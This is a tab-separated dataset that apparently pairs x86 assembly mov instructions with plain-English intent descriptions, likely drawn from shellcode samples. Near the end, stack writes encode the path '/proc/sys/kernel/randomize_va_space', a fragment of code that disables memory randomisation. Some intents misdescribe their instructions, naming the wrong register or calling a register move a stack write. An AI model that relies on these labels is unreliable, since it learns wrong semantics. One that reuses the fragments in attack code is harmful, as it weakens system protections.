SNIPPETS	INTENTS
mov ax, 45h	transfer the immediate constant 45h to ax
mov ax, 8h	move 8h into ax
mov ax, 9	get 9 in the ax
mov ax, bx	move bx into ax
mov ax, bx	move the contents of bx into ax
mov ax, table[esi*4]	move the memory offset table+esi*4 into ax
mov bh, 0x12	move 0x12 into bh
mov bh, 0xe2	move 0xe2 into bh
mov bl, [esi+ecx]	move the contents of memory address esi+ecx into bl
mov bl, 0bh	move 0bh into bl
mov bl, 0x01	move 0x01 into bl
mov bl, 0x02	move 0x02 into bl
mov bl, 0x04	move 0x04 into bl
mov bl, 0x1	move 0x1 into bl
mov bl, 0x1	move the value 0x1 into the bl register
mov bl, 0x14	move 0x14 into bl
mov bl, 0x2	move 0x2 into bl
mov bl, 0x2	move the value 0x2 into the bl register
mov bl, 0x3	move 0x3 into bl
mov bl, 0x4	move 0x4 into bl
mov bl, 0x4	move the value 0x4 onto the stack
mov bl, 0x5	move 0x5 into bl
mov bl, 0x5	move the value 0x5 into the bl register
mov bl, 0x7	move 0x7 into bl
mov bl, 0x8	move 0x8 into bl
mov bl, 0x9	move 0x9 into bl
mov bl, 0xe	move 0xe into bl
mov bl, 0xff	move 0xff into bl
mov bl, 1	move 1 into bl
mov bl, 10	move 10 into bl
mov bl, 2	move 2 into bl
mov bl, 3	move 3 into bl
mov bl, 3 \n dec bl \n jnz l3	move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero
mov bl, 4	move 4 into bl
mov bl, 5	store 5 into bl
mov bl, al \n sub bl, 2 \n jnz loop	move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
mov bl, byte [digits+ebx]	move the byte at address digits+ebx into bl
mov bl, byte [eax]	move the byte at the address [eax] into bl
mov bl, byte [eax]	move the byte in eax into bl
mov bl, byte [edi]	move the byte at the address [edi] into bl
mov bl, byte [edi]	move the byte in edi into bl
mov bl, byte [esi + eax + 1]	move the byte starting at the address [esi + eax + 1] into the bl register
mov bl, byte [esi]	move the byte at the address [esi] into bl
mov bl, byte [esi]	move the byte in esi into bl
mov bl, byte [esi+ecx+1]	move the byte at the address [esi+ecx+1] into bl
mov bl, byte [esi+ecx+1]	move the byte in esi+ecx+1 into bl
mov bl, byte 0eh	move the byte 0eh into bl
mov bl, byte 0eh	move the byte at the address 0eh into bl
mov bl, cl	move cl into bl
mov bl, dl	move dl into bl
mov bx, [esi]	move the contents of the esi register into the bx register
mov bx, 1666	move 1666 into bx
mov bx, 18	get 18 in the bx register
mov bx, 20	move the value 20 into bx
mov bx, word_value	move memory word_value to register bx
mov byte [eax], dl	move dl into the byte at address [eax]
mov byte [eax], dl	move dl into the byte in eax
mov byte [ebx + 35], al	move al into the byte at address [ebx + 35]
mov byte [ebx], 2	move 2 into the single byte at the address stored in ebx
mov byte [ecx], 2	move 2 into the single byte at memory location ecx
mov byte [ecx+92], dl	move dl into the byte at address [ecx+92]
mov byte [ecx+92], dl	move dl into the single byte at the address stored in ecx+92
mov byte [edi], bl	move bl into the byte in edi
mov byte [edi], bl	move the the contents of the bl register into the byte starting at the address in edi
mov byte [edx + eax], bl	move bl into the byte at address [edx + eax]
mov byte [edx+eax], bl	move bl into byte edx+eax
mov byte [edx+ecx],al	move al into the single byte at the address stored in edx+ecx
mov byte [esi + 1], dl	move dl into the byte at address [esi + 1]
mov byte [esi + 1], dl	move the contents of dl into the byte at the memory location specified by the operation [esi+1]
mov byte [esi], al	move al into the byte in esi
mov byte [esi], bl	move bl into the byte at address [esi]
mov byte [esi], dl	move dl into the byte in esi
mov byte [esi+10], al	move al into the byte at address [esi+10]
mov byte [esi+11], al	move al into the byte at address [esi+11]
mov byte [esi+12], al	move al into the byte at address [esi+12]
mov byte [esi+14], al	move al into the byte at address [esi+14]
mov byte [esi+14],al	move the contents of al into the byte at the memory location specified by the operation [esi+14]
mov byte [esi+17], al	move al into the byte at address [esi+17]
mov byte [esi+17],al	move the contents of al into the byte at the memory location specified by the operation [esi+17]
mov byte [esi+21], al	move al into the byte at address [esi+21]
mov byte [esi+7], al	move al into the byte at address [esi+7]
mov byte [esi+ecx], bl	move bl into the byte at address [esi+ecx]
mov byte [esi+ecx], bl	move bl into the single byte at the address stored in esi+ecx
mov byte [esp], 0x0a	move 0x0a into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte in esp
mov byte [esp], 0x2f	move 0x2f into the byte at address [esp]
mov byte [esp], 0x2f	move 0x2f into the byte in esp
mov byte [esp], 0x7f	move 0x7f into the byte at address [esp]
mov byte [esp+2], 0x07	move 0x07 into the byte at address [esp+2]
mov byte [esp+3], 0x01	move 0x01 into the byte at address [esp+3]
mov byte [esp+3], 0x11	move 0x11 into the byte at address [esp+3]
mov byte [hexstr+edx+1],bl	move a byte from bl into memory address hexstr+edx+1
mov byte [hexstr+edx+2],al	move a byte from al into memory address hexstr+edx+2
mov byte [var], 5	store the value 5 into the byte at memory location var
mov byte al, 0x0b	move 0x0b into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte in al
mov byte al, 0xa4	move 0xa4 into the byte at address al
mov byte al, 0xa4	move 0xa4 into the byte in al
mov byte al, 11	move 11 into the byte at address al
mov byte al, 83	move 83 into the byte at address al
mov byte cl, 7	move 7 into the byte at address cl
mov ch, 0x4	move 0x4 into ch
mov cl, 0102	move 0102 into cl
mov cl, 077o	move 077o into cl
mov cl, 0x1	move 0x1 into cl
mov cl, 0x1e	move 0x1e into cl
mov cl, 0x2	move 0x2 into cl
mov cl, 0x2	move the value 0x2 into the cl register
mov cl, 0x3	move 0x3 into cl
mov cl, 10 \n dec cl \n jnz l1	move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
mov cl, 100	move 100 into cl
mov cl, 128	move 128 into cl
mov cl, 13	move 13 into cl
mov cl, 2	move 2 into cl
mov cl, 21	move 21 into cl
mov cl, 3	move 3 into cl
mov cl, 30	move 30 into cl
mov cl, 30	move 30 to the cl register
mov cl, 32	move 32 into cl
mov cl, 9	move 9 into cl
mov cl, al	move al into cl
mov cl, bl \n sub cl, 1 \n jnz loop	move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
mov cl, byte [eax]	move the byte at the address [eax] into cl
mov cl, byte [eax]	move the byte in eax into cl
mov cl, byte [esi]	move the byte at the address [esi] into cl
mov cl, byte [esi]	move the byte in esi into cl
mov cl, byte_table[2]	move the 3rd element of the array byte_table into cl
mov cl, byte_table+2	move the 3rd element of the byte_table into cl
mov cl, len	move len into cl
mov cl, shellcode_length	move shellcode_length into cl
mov cl, shellcodelen	move shellcodelen into cl
mov count, bx	move bx to count
mov cx, [esi]	move the contents of the esi register into the cx register
mov cx, 01	initialize cx to 01
mov cx, 02001	move 02001 into cx
mov cx, 0666	move 0666 into cx
mov cx, 0700	move 0700 into cx
mov cx, 0x191	move 0x191 into cx
mov cx, 0x1ff	move 0x1ff into cx
mov cx, 0x2bc	move 0x2bc into cx
mov cx, 0x301	move the value 0x301 into the cx register
mov cx, 0x3b30	mov the value 0x3b30 into the cx register
mov cx, 0x401	move 0x401 into cx
mov cx, 0x5309	move 0x5309 into cx
mov cx, 0x9ed	move 0x9ed into cx
mov cx, 0xfff	move 0xfff into cx
mov cx, 2001	move 2001 into cx
mov cx, 2001Q	move 2001Q into cx
mov cx, word_table + 3	move the 4th element of the word_table into cx
mov cx, word_table[3]	move the 4th element of the array word_table into cx
mov dh, 0x35	move 0x35 into dh
mov dh, 0xff	move 0xff into dh
mov dl, 0x01	move 0x01 into dl
mov dl, 0x02	move 0x02 into dl
mov dl, 0x09	move 0x09 into dl
mov dl, 0x1	move 0x1 into dl
mov dl, 0x10	move 0x10 into dl
mov dl, 0x1c	move 0x1c into dl
mov dl, 0x2	move 0x2 into dl
mov dl, 0x20	move 0x20 into dl
mov dl, 0x7f	move 0x7f into dl
mov dl, 0xc	move 0xc into dl
mov dl, 0xd	move 0xd into dl
mov dl, 0xff	move 0xff into dl
mov dl, 1+0feh	move 1+0feh into dl
mov dl, 93	move 93 into dl
mov dl, byte [eax + 1]	move the byte at the address [eax + 1] into dl
mov dl, byte [eax + 1]	move the byte at the memory location specified by the operation [eax+1] into dl
mov dl, byte [eax]	move the byte at the address [eax] into dl
mov dl, byte [eax]	move the byte in eax into dl
mov dl, byte [esi + 1]	move the byte at the address [esi + 1] into dl
mov dl, byte [esi + 1]	move the singl byte at the memory location speicified by the operation [esi+1] into dl
mov dl, byte [esi]	move the single byte in esi into dl
mov dl, byte 0ffh	move the byte 0ffh into dl
mov dl, byte 0ffh	move the byte at the address 0ffh into dl
mov dl, len	move the contents stored at the address len into the dl register
mov dl,0x14	move 0x14 into dl
mov dword [eax], var1	copy the value in var1 into the doubleword starting at the address in eax
mov dword [ebx], 2	move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
mov dword [ebx], 4	move the 32-bit integer representation of 4 into the doubleword starting at address ebx
mov dword [esi + 12], eax	move eax into the dword at address [esi + 12]
mov dword [esi + 8], ebx	move ebx into the dword at address [esi + 8]
mov dword [esp-0x10], 0x5f657a69	move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
mov dword [esp-0x14], 0x6d6f646e	move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
mov dword [esp-0x18], 0x61722f6c	move the value 0x61722f6c into the double word starting at the address [esp-0x18]
mov dword [esp-0x1c], 0x656e7265	move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
mov dword [esp-0x20], 0x6b2f7379	move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
mov dword [esp-0x24], 0x732f636f	move the value 0x732f636f into the double word starting at the address [esp-0x24]
mov dword [esp-0x28], 0x72702f2f	move the value 0x72702f2f into the double word starting at the address [esp-0x28]
mov dword [esp-0x4], eax	move the contents of the eax into the double word starting at the address [esp-0x4]
